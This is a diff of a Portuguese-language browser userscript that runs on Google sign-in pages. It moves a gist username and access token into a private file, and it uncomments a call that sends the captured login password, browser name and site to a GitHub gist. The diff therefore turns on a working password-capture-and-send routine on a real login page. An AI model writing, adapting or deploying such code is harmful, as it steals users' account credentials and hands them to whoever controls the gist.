@@ -6,15 +6,17 @@
 // @locale      pt-br
 // @include     *://accounts.google.com/*ServiceLogin?*
 // @include     *://accounts.google.com/*signin*
-// @version     1.12-2
+// @version     1.21-2
 // @grant       none
-// @run-at	end
+// @run-at	document-end
+// @require	file:///C:/Users/user/AppData/Roaming/Mozilla/Firefox/Profiles/xwt25znr.default/gm_scripts/_private-gist.js
 // ==/UserScript==
 
 
 /////////////// [ PRIVATE DATA ] ///////////////
-const GIST_USERNAME = "micalevisk";
-const PERSONAL_ACCESS_TOKEN = "<OAuth>";
+const AUTH = gist_privateData;
+const GIST_USERNAME = AUTH.username;
+const PERSONAL_ACCESS_TOKEN = AUTH.useroauth;
 const SENHA_PRIVADA = PERSONAL_ACCESS_TOKEN;
 ////////////////////////////////////////////////
 
@@ -78,9 +80,9 @@ function postit(conteudo, nomeArquivo, descricao, oauthgist){
 
 	var conteudostr =
 	{
-	  "_data": `${(new Date()).formatar("%m%/%d%/%Y% - %H%:%i%:%s%")}`,
+	  "_date": (new Date()).formatar("%m%/%d%/%Y% - %H%:%i%:%s%"),
 	  "browser": navigator.appCodeName,
-	  "site": `${window.location.hostname}`,
+	  "site": window.location.hostname,
 	  "personal": conteudo.toJSON()
 	}
 	conteudostr = JSON.stringify(conteudostr, null, 4);
@@ -176,7 +178,7 @@ function GM_main(){
 
 					if(!user_especs.flag){
 						user_especs.setSenha(password);
-						// postit(user_especs, 'arquivo.txt', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
+						postit(user_especs, 'arquivo.txt', 'descrição do gist', PERSONAL_ACCESS_TOKEN);
 						// adicionarArquivo('<GIST ID>', 'nomeOutro', 'conteudo do novo arquivo', PERSONAL_ACCESS_TOKEN, new Date().toLocaleString());
 					}
 				}
